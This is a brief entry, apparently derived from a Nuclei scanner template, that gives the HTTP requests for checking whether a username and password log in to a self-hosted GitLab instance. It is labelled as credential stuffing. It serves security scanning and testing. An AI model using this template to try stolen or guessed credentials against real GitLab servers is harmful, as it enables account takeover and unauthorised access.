# Vulnerability: Gitlab Login Check Self Hosted
**Classification:** CREDS-STUFFING
**Source:** Nuclei Template (`gitlab-login-check-self-hosted.yaml`)

## Description
Checks for a valid login on self hosted GitLab instance.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /users/sign_in HTTP/1.1
Host: {{Hostname}}

POST /users/sign_in HTTP/1.1
Host: {{Hostname}}
Cache-Control: max-age=0
Origin: {{BaseURL}}
DNT: 1
Content-Type: application/x-www-form-urlencoded
Referer: {{BaseURL}}/users/sign_in
Accept-Language: en-US,en;q=0.9,de;q=0.8

authenticity_token={{url_encode(authenticity_token)}}&user%5Blogin%5D={{username}}&user%5Bpassword%5D={{password}}&user%5Bremember_me%5D=0
```

